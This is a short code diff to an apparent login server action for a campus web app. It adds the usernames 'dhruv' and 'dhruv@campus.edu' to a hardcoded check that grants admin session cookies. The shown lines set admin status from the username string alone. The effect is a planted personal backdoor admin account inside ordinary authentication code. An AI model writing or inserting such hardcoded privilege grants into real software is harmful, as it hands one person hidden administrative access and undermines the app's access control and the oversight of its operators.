@@ -23,8 +23,13 @@ export async function loginWithCredentialsAction(formData: FormData) {
   const cookieStore = await cookies();
   const normalized = usernameOrEmail.toLowerCase();
 
-  // Admin access check
-  if (normalized === 'admin' || normalized === 'admin@campus.edu') {
+  // Admin access check: Dhruv
+  if (
+    normalized === 'admin' ||
+    normalized === 'admin@campus.edu' ||
+    normalized === 'dhruv' ||
+    normalized === 'dhruv@campus.edu'
+  ) {
     cookieStore.set('session_user_id', 'usr-admin', { path: '/', httpOnly: true });
     cookieStore.set('user_role', 'ADMIN', { path: '/', httpOnly: true });
     cookieStore.set('user_email', 'admin@campus.edu', { path: '/', httpOnly: true });
